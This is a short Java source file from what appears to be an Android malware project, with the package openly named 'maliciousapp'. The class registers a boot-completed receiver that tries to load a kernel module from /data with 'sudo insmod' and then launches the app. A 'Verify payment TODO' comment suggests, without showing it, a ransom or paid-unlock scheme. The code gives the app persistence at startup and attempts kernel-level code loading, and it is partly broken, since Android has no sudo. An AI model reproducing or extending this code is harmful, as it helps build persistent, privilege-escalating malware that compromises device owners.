package com.example.maliciousapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import java.io.IOException;

public class RunOnStartup  extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {

            //Verify payment TODO

            try{
                Process su = Runtime.getRuntime().exec("sudo insmod /data/regul.ko");
            }catch(IOException e){
                try {
                    throw new Exception(e);
                } catch (Exception e1) {
                    e1.printStackTrace();
                }
            }
            Intent i = new Intent(context, MainActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(i);
        }
    }

}